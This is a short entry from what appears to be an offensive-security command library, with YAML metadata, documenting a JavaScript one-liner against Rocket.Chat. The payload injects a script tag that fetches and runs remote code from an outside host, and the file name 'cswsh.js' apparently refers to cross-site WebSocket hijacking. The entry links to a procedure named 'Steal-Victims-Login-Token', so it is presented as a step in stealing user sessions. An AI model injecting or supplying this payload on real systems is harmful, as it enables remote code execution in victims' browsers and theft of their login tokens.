---
data: >-
  let
  s=document.createElement('script');s.src='https://sectex.dev/files/cswsh.js';document.body.appendChild(s);
tags:
  - script-load
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.240Z'
id: 86c60b52-3b48-422c-b61b-826b381f01df
verified: false
validated: true
submitted: true
---
# rocket-chat-load-external-script

## Command

```javascript
let s=document.createElement('script');s.src='https://sectex.dev/files/cswsh.js';document.body.appendChild(s);
```

## Description

Creates and appends a script element to load remote JS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| s.src | External script URL | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Script loads and runs.

## Related

- [[procedures/Steal-Victims-Login-Token]]
